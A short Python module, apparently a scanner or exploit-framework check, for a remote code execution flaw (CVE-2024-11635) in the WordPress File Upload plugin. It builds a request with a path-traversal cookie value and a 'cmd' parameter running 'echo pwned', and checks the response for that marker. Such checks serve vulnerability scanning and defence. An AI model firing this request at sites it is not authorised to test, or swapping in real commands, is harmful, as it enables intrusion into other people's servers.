"""
WordPress File Upload <= 4.24.12 (CVE-2024-11635) - Remote Code Execution
Description: RCE via wfu_ABSPATH cookie parameter
Severity: Critical
CVSS Score: 9.8
Affected Versions: WordPress File Upload <= 4.24.12
Reference: https://nvd.nist.gov/vuln/detail/CVE-2024-11635
"""

def get_payload():
    return {
        'path': '/wp-content/plugins/wp-file-upload/wp-file-upload.php',
        'method': 'GET',
        'cookies': {
            'wfu_ABSPATH': '../../../'
        },
        'params': {
            'cmd': 'echo pwned'
        }
    }

def check_response(response):
    return response.status_code == 200 and 'pwned' in response.text 